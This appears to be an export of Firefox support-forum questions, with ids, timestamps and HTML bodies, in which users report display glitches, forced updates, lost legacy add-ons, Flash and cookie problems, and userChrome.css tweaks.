I am having trouble with Firefox not wanting to display fonts or text boxes correctly in some situations. I am providing two screen shots from a client bridge configuration page to illustrate the problem. One shot is of Firefox and the other is from the Chromium browser that came with Zorin. The boxes display perfectly in Chromium but, as you can see, there are issues in Firefox (font color is grey, font too big, box background transparent, box not large enough for text). I have tried playing with the font and color settings in preferences but all i managed to do was get the background of the text boxes to display white, unfortunately, this also caused many more appearance problems with other websites so i changed it back... I am using distro of Linux called Zorin OS 12.4. and a fresh install of Firefox 63.0.3. 
</p><p>I guess I could use the Chromium browser instead, but I'm a big fan of Firefox and would rather use it ;) ANy help would be much appreciate
Thanks,

1243687,1544741849,Lots of problems,"<p>Okay so I have a few problems with Firefox. I usually have problems with my browsers but this one has not fixed any of the problems I had before so I decided to bring them up now. I have reinstalled Firefox before and the problems still occur. I do not really want to install it again because I have around 31 extensions and 17 scripts. I have tried this on a fresh install and decided to ignore it but it's becoming more and more of a problem.
</p><p>1. History, so when I put the settings to not put my history on the search bar it ignores the clicked setting no matter how many times I click and un-click it, so I made it so it would not save my history. That worked but it would not save my passwords, I have a account that I have to accept on my phone. And another where I have to get a special code. This is incontinent and does not give me options to change what it remembers and what it doesn't. Also when I turned it off it actually did remember all of my passwords and accounts. 
</p><p>2. Videos, I had a problem with this back in 2013, 15, and 16 and it still happens. If I Maximize the window it starts to tear the video but if I go minimized it is fine, and if I full screen it is also fine.
</p><p>3. Firefox account this one I just don't like it being on as soon as I login.
</p><p>4. I've removed all the ""One-Click Search Engines"" I don't want and they keep coming back.
</p><p>5. Some file types (even though I have the downloader option saved to ask me where to save) just save to some random folder in %appdata% that I can't actually get into said folder by normal means. So if I close the browser it just removes it because it's not in the Downloads folder its in a hidden folder that is hidden in other folders.
</p><p>6. It saves all the search options in different websites excluding google because they have their own bad problems with google accounts. 
</p><p>Now my question is, are these issues they plan to fix or is there a way I can fix any of these?

1243705,1544762527,Firefox 63 tab.close.button.transparent.background w/ hovered background,"<p>Fx 63.0.3 in Linux.
I added a tab close button (hovered) colored background.  It's not necessarily same W x H as the inactive button transparent background - which is fine.
</p><p>I'd like to move the (inactive) 'X' close to the tab right end (did move it - not necessarily easiest way).
The bottom of red background in hovered state needs to be close to the tab bottom &amp; even with the tab's right end / side, for a better, easier target to close.  I did that - more or less. :)
</p><p>The issue (that may have no solution) is the inactive button's transparent BG is 20x20px, I believe.
So far, unless I make the hovered, colored background the same size as the inactive button's , it distorts the 'X' when the red background appears.  So the button is semi-fixed?  When hovered, it doesn't ""translate"" the X icon in the same HxW.   Yes, people are starving in Africa &amp; we're worried about pretty browsers.
</p><p>I assume because the inactive close button has different dimensions and margins than the added background does, the only way I can get the ""legs"" of the 'X' near the tab border is enter different margins for it than for the hovered, colored background?
</p>
<ul><li> Question on the last part:  *When you have a 20x20 button, originally positioned so the 'letter X' was ~ 5 - 7px from the border / end, what does Firefox ""do"" w/ the transparent part of the button, when you enter margins so the 'X' is very near the right tab border (right end of the moz-box or container)?  
</li><li> Does it in effect, 'remove' part of the transparent button, as different margins are entered, to move the button closer &amp; closer to the container's end?
</li></ul>
<p>It appears the default close button's 'X' is 10px WxH.  Since browser toolbox showed the button was 20x20px - I think, then it has a 5px margin? on all sides of the 'X'  image.
</p><p>The main goals are:
</p>
<ul><li> 1. Get more room for text on tabs.  I also changed margins on the tab icons to move them near the tab left border &amp; disabled tab text fadein.
</li></ul>
<ul><li> 2. Have a clickable background  to close tabs - that lines up at the tab bottom, right corner &amp; not have to ""fish around"" for the close button.  I have that.
</li></ul>
<p>So far, unless I make the hovered background the exact dimensions of the button, then use the exact margins on both, it will distort the X - depending on how different in size the inactive &amp; hovered sizes are.
</p><p>I couldn't find a CSS property / feature that would allow *the original* X close button to shift up or left (undistorted), when the hovered background appears.
</p><p>Maybe the original close button could be hidden during hover and a new close button specified (adding a colored BG) with a new size?  Say, 15x20 (or 30)?   As long as the hovered BG is near the bottom, right corner.
</p>
<ul><li>  I think whatever space is occupied by the width of the transparent button edge (plus padding, if any), dictates how far the tab's text can extend to the right?  Once hovered, I don't care if more or less text shows, since I'll be closing  the tab, not reading it.
</li></ul>
<ul><li> If that's true, I could modify / create an overall smaller inactive close button - allowing more text on tabs.  Or just ""remove"" the *inactive state* close button, &amp; specify the same close button  (plus red BG) for the hovered state.
</li></ul>
<p>I'm not sure how hard it would be.
</p><p>It was kind of tedious, figuring out how much negative margin values to enter (for 2 different element sizes), so they both wound up (nearly) equidistant from the tab R end.  Key word being ""nearly"".  I didn't want the 'X' touching or almost - the  tab divider line.  But I  want the hovered background touching it, to make an easier closing target. 
</p><p>In blown up screenshot(sss), it seemed if I measured the distance between the close button visible 'X' and the tab's R border (say 7px), if I entered 5px, the visible 'X' moved, but NOT so it was 2px from the R border.  It seemed something else was affecting it.
</p><p>.tabbrowser-tab .tab-close-button {   /* move inactive close button closer to tab R-end */

1243777,1544811809,"Why does using the 'back' button sometimes cause a page reload, but other times does NOT cause a page reload in the same app?","<p>I've noticed this on various sites, but I'll use YouTube as an example. I'm sitting on my YouTube 'home' page and I see a set of 'suggestions'. I click on one of the suggested vids and watch it. Afterward, I hit the 'back' button in the browser (there is not an embedded back button in the app). Sometimes hitting the 'back' button takes me back to the same YouTube page with my suggested videos and I can watch another. Other times, hitting the 'back' button causes a new page to load and I now have a new set of suggested videos displayed.
This behavior is not consistent - sometime the page load occurs, other times the same page appears. I cannot detect a pattern to this.
What's annoying about this is that there may have been more than one thing I wanted to view on the initial 'suggested videos' section of the original page displayed. However, after watching one of the vids and hitting the 'back' button, if a new page loads, I now no longer have access to those other suggested vids I wanted to watch.
As I noted earlier, I've seen this behavior in other apps too. 
I don't know if this is the right place to ask about this, or if it's a browser thing at all, I'm just trying to understand what's causing this behavior and figure out if there's anyway for me to mitigate it.

These past few months however, the problem just won't go away.  I can play videos at 1080p or at 720p 60fps, but 1080p 60fps seems to drop more frames than not.  This is more of an issue for me now because I just recently improved my Internet enough to play videos at that resolution and not wait for them to buffer every few minutes.
</p><p>I'm using the latest version of Firefox (64.0).  I tried disabling Hardware Acceleration, as was suggested, and I guess it's a bit better, but it's still dropping about 50% of the frames according to YouTube's ""stats for nerds.""  Others have said to alter Firefox's configuration, but when I tried to, Firefox warned me not to proceed unless I knew what I was doing, which I really don't.  Some have recommended installing various add-ons, but there's always someone claiming it doesn't help.
</p><p>I've tried using Google Chrome to watch the same videos, but it causes my CPU to spike so there's constant choppiness anyway.  Microsoft Edge is the only browser I've used that seems to play these videos smoothly, but I'd rather not use it if I can help it.  I've used Firefox for years now.  I'm comfortable with it and it serves me well in most capacities.
</p><p>I've seen others ask about this, but all the answers either haven't worked for me or leave me confused.  I'm not the most tech-savvy guy, so I'd appreciate it if someone could dumb it down just enough to walk me through it.

They did something technical (so over my head) with inspecting the element section of the webpage and found out for the Firefox there is no prefix in CSS style (image property). Once they added the proper CSS style prefix from the list located at <a href=""https://developer.mozilla.org/en-US/docs/Glossary/Vendor_Prefix#Property_and_method_prefixes"" rel=""nofollow"">https://developer.mozilla.org/en-US/docs/Glossary/Vendor_Prefix#Property_and_method_prefixes</a> the street view showed for them.

1243839,1544846645,Continual messages from Firefox,"<p>Firefox is beginning to become more of an annoyance than it is worth - most of the reason for this is the continual string of updates, messages, click bars and pop ups it shows on start up. 
</p><p>No these are not spam or bad add ins, they are programmed interruptions inherent to FF.
</p><p>Users of FF want to get on and do things. Having to close windows with news about the latest update (and there are soooo many updates), or news that the opml feed is now on your desktop (another thing to waste time attending to) or messages about privacy or messages about syncing pages and settings or pop up messages about how FF is private etc are just plain annoying. 
</p><p>It is getting to the point where I expect to wait longer for FF to start and then have to wade through cruft, than it takes to boot the entire Windows 10 OS and deal with the Ms cruft on the log in screens. 
</p><p>If people want to learn, then they will look stuff up. So seriously - stop popping up tabs, notices, messages, dialog boxes and other cruft. Let the users just get on with using FF rather than putting up with cruft about using FF.
</p><p>FF is now officially slower to start than every other browser we have and slower than me booting an entire windows 10 pc - all because of continuous updates which don't seem to do anything for me - or most users. oh sure, you can say its for security but if you are patching security holes as regularly as you are updating FF then there is something terribly wrong in your programming standards and coding methodologies - not to mention test process.
</p><p>Its a trend to tell people about your product - but its one that annoys users. We just want to get on with using whatever - so please get out of our way and let us just use the product. 
</p><p>I like FF - but I liker it a lot less than I used to as its now annoying the crud out of me almost every day.

1243921,1544911045,Firefox 64.0,"<p>Dear Whomever,
</p><p>Isn’t it just grand that the almighty Firefox doesn’t work for all websites while Internet Explorer has no trouble or problems whatsoever?  I recently (since the “Upgrade,” I believe) lost my ability to Log-In to my “Capital One” account (what I have been repeatedly getting is “We seem to have hit a snag.”).  However, when I tried using my Internet Explorer, I had no trouble.  The “brilliance” of Mozilla never ceases to amaze, but more appropriately, frustrate.

Examples are gstatic of google, ebaystatic of eBay or geekdo-static of <a href=""http://boardgamegeek.com"" rel=""nofollow"">boardgamegeek.com</a> (all .com extension). It has something to do with a script because after I installed No-script this stopped the freezes as long as I did not whitelist those static pages.
</p><p>If I do whitelist them the freeze will not occur every time but about once every two times I visit the site or move from one page on the site to another. What happens is that Firefox just shows its busy you can click nothing on the firefox page and the only way to exit is by using TaskManager to close Firefox.
</p><p>The only potential additional thing is that my hosts file is quite extensive in blocking tracking and advertising sites but until the Firefox updates of May this never posed a problem. The issue is getting frustrating as many sites simply dont function unless you allow their static page to run a script, it then becomes hit and miss for me to carry on browsing.

</p><p>I recently switched back to FF from chrome and I really love it. There is one thing I cannot get to work though: I would like to have google as default search engine but without country redirect.

1244148,1545084467,addons no longer available,"<p>Hi:  I am trying to decide do I just totally give up on Firefox after all these years and move to Chrome or is there some logical path for addons planned/in process that I do not know about.
</p><p>It is like Firefox Management Team/Committee team made this technical decision with little understanding on the impact to the developers that had put in hard yards for years, or users who had been using these addons. I am at a loss when I try to understand why would they jeopardise so much.
</p><p>Since Firefox went to that ""new firefox"", sorry I dont know the technical lingo, most of the addons I use became unavailable. I have since written to each developer to ask, will they be upgrading their addon and the answer is NO. 
So basically Firefox is only useful to me if 
</p>
<ul><li> I stay in the old version on Mac Sierra OSX (55.0.3).  
</li><li> For the new windows 10 brand new laptop I tried also to create using the new Firefox and it was very unsuccessful as there are no addons even close to what I was using. 
</li></ul>
<p>For the Cookies controller there are some close but nothing as good as this addon in terms of how I used it -- manually removed cookies.
</p><p>On my Mac Firefox 55.0.3, I have the following addons  (all these have the LEGACY yellow highlight tag in the list)
</p><p>1 Cookie Controller
</p><p>2 Roomy Bookmarks Toolbar
</p><p>3 Session Manager
</p><p>4 New Add On Bar
</p><p>5 Add Bookmarks Here
</p><p>6 Change Bookmark Recent Folder List Length
</p><p>7 Open Bookmarks in New Tab
</p><p>8 Download Status Bar
</p><p>9 AutoPin Tab
</p><p>10 Close Tab Button
</p><p>11 Tab Open/Close Control
</p><p>12 and uBlock Origin I cannot update as it says on its webpage, with this technical change, it is not supported, so not upgrade it.

1244156,1545090157,notifier sync is on and active,"<p>Hi
</p><p>I installed the new Firefox on Windows 10 and after install the first thing I see it asking me for email... when I look closer it relates to Sync. This is most concerning to me.
</p><p>As it encourages newbies to sign up to Sync WITHOUT realising the risk of using sync. Please correct me if I am wrong, my understanding is 
- Firefox still has not made a notifier that sync is being used, when it is being used.
- In firefox we have no ability to turn OFF sync forever. Require a passcode to turn it ON.
</p><p>It is easier for someone to hack a computer and activate sync wihtout you knowing. It happened to me and I only realised when they tried to access my gmail account. And upon investigation I discovered they had turned Firefox Sync on.  So I dont want to use Firefox Sync ever.
</p><p>It happened to a few of my friends and they told me it was reported to firefox. But i dont see any evidence their feedback was taken on.
</p><p>Please advise.

This kind of website is now considered insecure by Mozilla. Ok fine. But I allowed the security exception and it seems that the browser is still having trouble rendering the page properly.   This is one example of what I mean:  <a href=""https://digg.com/video/bubble-art-fire"" rel=""nofollow"">https://digg.com/video/bubble-art-fire</a>   I attached an image of the page .

Now I can't even view my favorites or collected Personas on my version of Firefox (which is 56) on the addons site. I know that this issue has been fixed with newer versions of FF, but I ABSOLUTELY REFUSE to update FF anymore thanks to your idiocy with removing a great deal of addons that I use almost daily.

I have asked similar question on a Duckduckgo's subreddit already, and I have received a response saying that it might be an issue with plugins that might be interfering, or Firefox itself.
I cannot control text inside search box of Duckduckgo on Firefox; using shortcuts like Ctrl+A, Ctrl+Shift+Left/Right, Ctrl+Left/Right causes some behaviour or text selection to happen, outside the text box that was active at the time when shortcuts were performed (I have tested with all plugins both disabled and enabled, and with shortcuts turned both on and off in duckduckgo's settings). I am not sure if it is an issue with Firefox itself because same shortcuts seem to work in google search box. On the other hand, I have also tested said shortcuts on both search engines on Chrome, and I didn't encounter such issues.

</p><p>Windows 10 Pro; 64-bit; all updates present; all operations normal and stable... up until the subject event.
</p><p>I was minimizing my browser while working in my eMail client (Thunderbird). Firefox is default, so clicking links from Thunderbird is normally seamless. Came to pass that I clicked, re-clicked and double-clicked a few links - in relatively rapid succession, or what I'd call ""normal browsing"" - trying to determine if the eMail links were bad...
</p><p>When I attempted to maximize Firefox from the taskbar, it would not respond... It took about a moment for me to scratch my head, survey my desktop for anomalies or threat warning dialogs, messages, notices, etc., when Firefox icon disappeared and the Firefox update status bar information dialog flashed on my screen, saying something like ""please wait for Firefox to refresh..."" when it disappeared being instantly replaced by the updated Firefox's 'welcome screen' but in a new style which obscured nearly 3/4's of my desktop.
</p><p>After surveying the changes and NOTING FOR THE RECORD THAT ALL MY ADD-ONS AND EXTENSIONS HAD BEEN OBLITERATED WITHOUT ANY NOTICE WHATSOEVER, I resized my browser back to normal - which seems to have stuck and remains stable - where I discovered the 'Old Firefox Data' on my desktop:

</p><p>It would be very nice and minimally respectful:  to have been warned prior to such an invasive update; to be given an option to delay and prepare to accept the update - which deviates significantly from normal updates; and/or to publish some explanation and information and A LINK to a summary explanation with your braggadocios 'Welcome' page.
</p><p>As a manageable aside, many of the settings (under the Tools &gt; Options menu) were also arbitrarily changed, most notably the desired default start page(s) and the manner to reset them. Most of the new defaults were not particularly dangerous however many more default settings tend to be a bit invasive and as the wording for each category changed significantly, a bit of research had to be done to analyze and determine whether to retain or change each and every one of these - which in no way matched the previous configuration I had so diligently conformed and maintained for quite a long time...
</p><p>I shouldn't need to compose a detailed complex question for true appropriate experts to project into this situation and conceive, formulate, and promulgate an appropriate constructive informative suggestive response with some variables and options for the many other Firefox clients who will likely experience this same trauma to an otherwise beautiful start of the day...
</p><p>Searching the help files and groups, the responses are non-responses and circle-logic which tend to justify placing a folder on the desktop - and various other arbitrary and capricious anomalies - in the first place without further explanation or options or suggestions... I am genuinely amazed that any of these non-responsive response have been archived and maintained as acceptable while the situation/situations seem to persist without any procedure or reasonable remedy to avoid it/them in the first place.
</p><p>I realize that Firefox is ""free"" and many dedicated experts selflessly sacrifice your experience and expertise to improve the internet browsing experience and generally make this imperfect world a better place in which to live, evolve, and thrive, but for your apparently socially uninformed information and for the record: it is NOT reasonable to expect people to be grateful for a reach-around when they didn't want the butt-raping in the first place.
</p><p>Please publish some options that may address my restoring my browser to it's previous comfortable settings using the 'Old Firefox Data' folder and/or its contents.
</p><p>PROCESSING NOTE: Uploading an image with this newly updated Firefox just glitched... looks like a Flash or Shockwave compatibility error from the progress icon. The Options &gt; Tools &gt; Add-ons and Extensions newly designed interfaces are not revealing any useful information... perhaps this new Firefox update categorizes its own image upload interface routine as ""dangerous""??? 
</p><p>I'll insert a directory list... above... if I can safely exit this setback...

</code><p><code></code>
</p><p>I don't know what's important and what isn't, so I haven't touched it much.

I have 2 tabs opened there.
</p><p>(Also I just noticed how Youtube's search bar doesn't appear, that's because it has been moved slightly off the of where I cropped the screenshot. Not the code's fault since I tried without it. Private browsing caused that which makes me question what else changes)
</p><p>After some searching I found this code:
</p><p><code>
</code></p><pre><code>#TabsToolbar:not([inFullscreen=""true""]) &gt; .private-browsing-indicator {
position: absolute !important;
right: 0;
bottom: 1px;

That makes me believe that at some point, the mask icon was detached or something. 
</p><p>I would appreciate some help for either a new code for moving the tabs to the bottom, or fixing the Private Browsing tab.

1248391,1548874977,Microphone does not work with Facebook messenger and behavior is weird.,"<p>Anytime I choose to use Firefox for audio communications it does not work. The people that I am trying to talk to does not listen anything. The cam works. To listen to the third parties I need to click on [mute my microphone] what seems to be the opposite of what should be done.
After trying to use Firefox and fail, the Firefox icon vanishes from my task bar and I need to reinstall it (Firefox entirely). After reinstall it works once, and that's it.
That is annoying! I like to use Firefox the most but do not know what to do more. 
Just for you to  know, Chrome and even Edge does not have such a behavior and both cam and mike are correctly installed and device drivers are up to date. Firefox  Privacy settings are already set for allowing microphone and camera on all microphone demanding sites I use (in this case Facebook Messenger). There are no restrictions applied by Win10 Pro for those devices. Could not find any good in the forums related to this behavior.

1248444,1548894062,"iframes, sessions within iframes, CORs & 3rd Party Cookies - Any documentation, and interaction should allow cookies?","<p>As a web developer, I create a lot of embeddable cross origin iframe widgets.  Unfortunately, if you have configured the Firefox setting of ""Block cookies and site data"" to ""Cookies from unvisited websites"", my iframe widgets no longer work when used on a cross origin domain, as they rely on user sessions.  Is there any documentation that defines what 3rd party cookies are?  I understand some users want to block them (as I myself was doing until I realized that would break my iframe widgets), but what I don't understand is why the cookies are continually blocked if a user specifically interacts with an iframe widget.  Doesn't user interaction imply it's now a visited website?  I should think the first load of the iframe would trigger blocked cookies, but if the user interacts with the iframe content willingly (by clicking a button which triggers an ajax call, for example), any resulting cookies should be respected even if Firefox is set to block 3rd party cookies.  I'm all for blocking 3rd party cookies that are loaded dynamically and are unwelcome, but if the user starts interacting with these iframes or controls, it would make sense to allow cookies, and that would be enough for my apps to not be broken if the user blocks 3rd party cookies.  I think web developers need a solution for keeping their legitimate cross origin apps from being blocked by 3rd party cookie settings if users are interacting and using them.
</p><p>I put together a sample application that shows how Firefox blocking third party cookies completely breaks sessions (since the cookie that is returned from the iframe call is discarded / not used).
</p><p><a href=""https://github.com/own3mall/firefox-3rd-party-cookies-test"" rel=""nofollow"">https://github.com/own3mall/firefox-3rd-party-cookies-test</a>
</p><p>I created a basic test to see if I could get Firefox to maintain sessions with iframes using a cross origin domain as the source. Unfortunately, I could not. Is there any work-around, or an easy way to detect the user's 3rd party cookie settings so I can warn them? I'd still like to know what is considered 3rd party, and what happens if you visit the cross origin domain directly in another tab before interacting with that iframe. Is it still considered 3rd party then?  What is the behavior and rules for this?  
</p><p>This seems like a serious problem that needs a better solution, and I like the interaction idea.

1248465,1548907617,On LINUX Firefox stops saving input fields values while saving the page,"<p>Normally when we save a page Firefox is saving values of input fields, too. Such as text field value, textarea value, radio buttons  value. 
Just a simple use case. take one of these urls:
data:text/html,&lt;input type=""text""&gt;
data:text/html,&lt;textarea&gt;
data:text/html,
Enter some data and save the page. Entered data will be saved as well.
Currently, I have two Firefox profiles on two different Linux (Ubuntu) machines when Firefox doesn't save input fields while I am using these profiles. When I create another profiles, input fields are saved again.  So, it is profile based issue. Firstly I noticed this strange behavior several years ago. Then I created a new profile and imported everything from the ""bad"" one. I am still keeping that ""bad"" profile on my old Ubuntu box. Now I have two more ""bad"" profiles on two different boxes.
Is there any explanation of this behavior? Is it just a bug?

Somehow after opening Firefox for the first time after installation I got an information displayed on the bottom of the browser that said that Mozilla was previously installed on my computer and asking if I want to restore my settings. I also tried to run firefox with disabled antivirus software (I use Kaspersy) and it didnt work.

We're a TLS everywhere, VPN everywhere shop. We very much know the implications of security workarounds. TL;DR: Shibboleet.
</p><p>While deploying our systems, we routinely have to directly access our customers' legacy systems that are ridden with SSL/TLS problems of almost every category: outdated algorithms, inadequate key lengths, hardcoded certificates, reused serials and so on. Some of these limitations can be worked around in the browser, others require configuring insecure settings, a few cannot be done away with. ""Contacting the site admininistrator and letting them know there's something wrong with their site"" is a non-option here. We're talking about *unfixable* systems whose design life is measured in two-digit years.
</p><p>The question is: how am I supposed to cope with this? Where is the big red switch to throw security out of the window for RFC1918 networks for the next half an hour? Where can I donate my left kidney? Where is the altar where I can sacrifice a goat to your preferred deity?

I would check the screenshot with alt+tab, then alt+tab back to the browser, type part of the string (lets say 4 characters), then alt+tab back to the image to check the rest of it... Now whenever i alt+tab back to the browser, it would select the entire text inside the password container instead of just leaving it as it is, thus making me replace the text I've already typed instead of just adding to it. That also happens a lot with the address bar.
Now I'm a pretty unfocused individual, and I know I can press the right arrow key on the keyboard to just avoid this selection, but it seems like firefox is the only browser who does that sort of thing and it always gets me on surprise.

Is there any way to force firefox to stop this selection madness?

No server, just local web pages on the system. The system allows our non-profit museum's visitors to get information on any of the 150+ artifacts we have, each one being a web page. Firefox starts with the homepage, then the user can go into the desired web page by touching the screen. Mkiosk can detect when the user has not done anything for a set period (2 minutes in our case) and then it resets back to the home screen. Works like a charm! No apache server needed or wanted for simplicity - just a bunch of pages and links.
However, I want to be able to either do other (non-firefox) things when the home web page has been showing for 5 minutes (which means nobody is using the system). Some things are 
1) Outputting a voice message to invite users to try the system
2) Bringing up a different firefox profile with an entirely different set of pages
3) Bringing up a different application on the screen.

</p><p>Adding to that predicament, the only browser I think that isn't wrapped up in Google's &amp; MS's web, is hopefully Firefox's browser, but my Yahoo's 'final' email today links apparently to only installing FF's latest browser.  Or might as I suspect, I can use an older version of FF, one that's compatible with Outlook 2007 and one that Yahoo aka 'Google-hoo' will 'leave me/us be'?
</p><p>Ultimately I'm wanting to keep what works (my money too), despite the flaunted less secure-ness of W7 and Outlook 2007, because I believe I'm savvy enough to likely avoid the touted pitfalls by avoiding online banking, not e-mailing company's I've not researched beforehand, maintaining reliable and respected AV, etc., etc.).
</p><p>So I'm hopeful can find a FF version that'll support Outlook 2007's e-mail application and  hopefully (only later use will likely tell) browser which still supports Yahoo mail.  Or am I simply being blocked by the expected deals being made designed to force users into buying into Windows 10?
</p><p>Accordingly I suspect if I go with FF's v65, likely I might any longer be able to use my Outlook 2003's email handler, and only be able to send and receive via or through FF's email application, thus likely not the convenience of being able to use my email storage application (Fogware e-mail backup and relocator) to export each year's sent, rec'd emails.
</p><p>So likely as not, I'll be forced to use other means of saving them as mentioned, possibly via FF's browser.  But heck, I found it nearly impossible just to unhide what the current version f FF's browser is (v65), let alone what 'Google-hoo's up to.
</p><p>Long of the short of it is, might someone in the know be able to tell me anything towards what we're dealing with here and how best to go about assuring I can still get my <a href=""http://yahoo.com"" rel=""nofollow"">yahoo.com</a> addressed e-mails if not only through FF's browser, then hopefully also thru Outlook 2007?
</p><p>From what I can find and confirm, might FF's v65 browser actually cross link with my Outlook 2003's handler, or if not then surely with Outlook's 2007's e-mail application by simply acquiring a full version of Office '12'?

When I cranked it up, I got a note that said I should update Firefox. So, like a reasonable user, I hit the go button, as it were. Smart move? My reply to that would involve many phrases and words not to be used in polite company. MY Firefox disappeared. Gone. Everything. Settings, bookmarks, ""users."" It was as if I had never, ever installed Firefox before. Virgin Firefox, one might say. Pure, unsullied, unused. So where the hell is MY Firefox? If I can get it back, I'll be delighted. If it indeed, as seems to be the case from my viewpoint at the moment, it is gone forever, then, well, sadly, I will be an ex-Firefox user forever. I can't see any reason for me to try to rebuild it all. Chrome may be annoying, but it does work and work well.

</p><p>Has anyone an idea what can cause this strange behavior. My browser settings are standard, I didn't change anything.

1248857,1549152601,Adobe Flash Player Problems with Firefox 65.0,"<p>Hi,
</p><p>I use Firefox and Adobe Flash to play several internet games.  Today, one of my laptops (W7Home-64 bit) updated to FF 65.0 and then would no longer play games like <a href=""http://Tankionline.com"" rel=""nofollow"">Tankionline.com</a> and other Flash games on <a href=""http://armorgames.com"" rel=""nofollow"">armorgames.com</a>.  I tried System Restore, which worked until the next time I closed and reopened the browser which then automatically updated to 65.0.  I played around with it, even copying the Profile directory from another computer, removing/reinstalling both FF and Flash, did not work.  Game works fine with MS Internet Explorer.  Other laptop and desktop also worked fine.  Then, I accidentally closed my browser on my desktop (W7Pro-64)  and then when reopened it also automatically updated to 65.0.  It now exhibits the same problem, Flash games will not work.
</p><p>The flash player is launched by FF, but flash games just hang and will not play.  Flash is version 32.0 r0, the latest available.
</p><p>I have a 2nd Laptop that has not yet updated to 65.0 and I have disabled the auto updater while waiting on seeing if the problem can be resolved.
</p><p>Thank you for any suggestions,
Tony D.

</p><p>So I'm on a certain website that use flash player a lot and I realized that suddenly, there was no history of the chats I had with people. Curious, I decided to clean all that with CCleaner but now, the website is asking me to ""activate local storage"" to be able to access the website and to make sure I'm not in private mode. And nothing is working. Here is what I tried so far : 
</p><p>- Update Flash Player
- Uninstall and install again
- Add a permission in the firefox cookies and data
- Tried to right click &gt; Options (I get only ""Allow"" or ""Refuse"" without anything else. No mention of the capacity I want to give nor anything. Just the two options)
- Tried Right Click &gt; Global options &gt; add manually the website. (But the website instantly disappears once I close firefox, not working and I can't even modify anything if Firefox is opened)
- Going on <a href=""http://www.macromedia.com/support/documentation/fr/flashplayer/help/settings_manager02.html"" rel=""nofollow"">http://www.macromedia.com/support/documentation/fr/flashplayer/help/settings_manager02.html</a>
(Nothing seems to be saved, as soon as I go onto another tab, it's like the first one got resetted.)
</p><p>So I'm getting a bit desperate. Using chrome work (but I'm using mainly firefox), going into private mode does work too (even though it said to not be in private mode) but regular firefox isn't working at all. And as I said, I can't even choose how much space I want to give. All I can do is ""allow"" or ""refuse"" but click on any does nothing at all. 
</p><p>I hope you'll be able to help me. Thanks.

There are tons of error reports on the firefox website pertaining to this.
looks like jscher2000 does not think something is wrong and thinks firefox
is configured incorrectly, but lots of people were complaining about this.
Note:  I noticed that very briefly when firefox loads up, it flashes on the
screen one of those firefox home pages that you get when you first install
or upgrade firefox.  Since this is a recently upgraded fedora from 28 to 29, 
I thought maybe it was getting stuck on that page (sort of like a 
splash screen after the upgrade).
........
</p><p>when I start firefox especially after a firefox upgrade I get the above error with the ""your connection is not secure"" message.

I found out that if you press the other button ""Back"" it takes me to <a href=""https://start.fedoraproject.org"" rel=""nofollow"">https://start.fedoraproject.org</a>; 
if I press the ""left"" button on firefox after that it takes me to the first web page in the ""stack""
which is my home page <a href=""https://www.google.com"" rel=""nofollow"">https://www.google.com</a> which loaded; but if I try a google search it does not work.

It is SUPPOSED to go back to the default homepage I set for myself, <a href=""https://www.google.com"" rel=""nofollow"">https://www.google.com</a>
on subsequent invocations of firefox.  But it does not.  Also it gives the security error.

This morning the snip or capture button and the ABS disappeared? I was able to find ABS and get it back on Firefox. No luck with my capture tool.  I refreshed my computer and then as well restored to an earlier date but still no button. I loved this button or icon I could just click and capture a whole page or a portion of the web page and best of all given an option to print the capture. My Windows 10 I know has a snip it tool but requires me to save the image and then go through other software installed on computer before I can print. a bummer
Doesn't matter to me what happened to the Capture App just need to know how to get 'it' back and or another software / app that works with firefox and lets me capture all or a portion of web page and most importantly, has the option to print.

1248914,1549210843,Forced updates is absolutely lame,"<p>Background:
</p><p>Was forced to upgrade to version 65 which broke the tabs on bottom setting.  Tried to install a ESR version but it kept crashing.  Went back to version 64 which was immediately forced to upgrade to the broken version again (which I didn't allow).
</p><p>The problem is this.  The people who have implemented this forced upgrade feature are probably using Windows 10 (forced updating) and are used to being treated like second class citizens by Microsoft.  Forced upgrading is completely inappropriate.  I've used browsers since Netscape, all of the Firefox versions, rarely use any other browser.  Never had a problem except with your forced updates.
</p><p>Lucky for me I found the registry fix for admins to disable updates.  Reasonably inconvenient but a hell of a lot better than putting up with forced updates that break the browser.
</p><p>Question:
</p><p>How about bringing back the choice to upgrade.  How about, at least giving two reminders to upgrade and then disabling the messaging.  This messaging is extremely disrespectful - i.e. we are going to keep on annoying you until you upgrade (to a broken system).

I have the latest update on High Sierra 10.13.6 and Firefox 65.0.  United healthcare problem started about 5 months ago when some of the pages would partially load or not load at all.   Clearing cache and cookies, etc. used to solve that problem, but not any more.   Problem still persists. 
Then after another update about a month ago, Yahoo Finance pages showed truncated column shown and inability to scroll to bottom of editing windows to save changes.  That seem to resolve after about 2 week and full screens reappeared.  But the Yahoo Finance problems came back after Firefox most recent update.
Also,  about a month ago my TD Ameritrade website started to load very slowly about the time the Yahaoo problem became worse.   Now, after the latest update, I get the the login page, but after inputting the id and password, website never connects---justs gives me a blank page that never loads.  
In summary, I have 3 important websites that I cannot access or navigate using Firefox, BUT CAN ACCESS AND NAVIGATE USING SAFARI.

I've got this weird problem with Firefox in Ubuntu 18.04. Sometimes, I don't really understand when and how, the browser tabs become fixed and I cannot move them across the bar. It's quite annoying really, as I'm using this quite often. When I pull a tab, it snaps out and creates another firefox window.
I'm using three extensions: privacy badger, ublock origin and showip. I've been using the same plugins on another Ubuntu and this problem never occured. I'm not using a custom theme. Not sure what's going on.

1249077,1549327430,Firefox 65 UserChrome.css Not working,"<p>Hello,
For quite a while I was using a custom UserChrome.css that removed minimize\maximize\close buttons from the tab bar.
It looked like this:
</p><p><code>
/* Firefox userChrome.css */
</code></p><p><code>@namespace url(""<a href=""http://www.mozilla.org/keymaster/gatekeeper/there.is.only.xul"" rel=""nofollow"">http://www.mozilla.org/keymaster/gatekeeper/there.is.only.xul</a>"");
</code></p><p><code>/* Hide min, max, close in title bar */
</code></p><code>
<ol><li>titlebar-min, #titlebar-max, #titlebar-close
</li></ol>
<p>{ display: none !important; }
</p><p>/* Hide minimize, restore, close in full screen */
</p>
<ol><li>minimize-button, #restore-button, #close-button
</li></ol>
</code><p><code>{ display: none !important; }
</code>
</p><p>But after latest update (to Firefox 65 I believe) the app doesn't recognize the code in UserChrome.css.
</p><p>I understand from Fx 65 change notes there were some changes to how Firefox parses css, isn't it?
</p><p>What should I do to make UserChrome.css work? 
</p><p>I would appreciate any other method of removing minimize\maximize\close buttons from the tab bar if it isn't doable with UserChrome.css now.
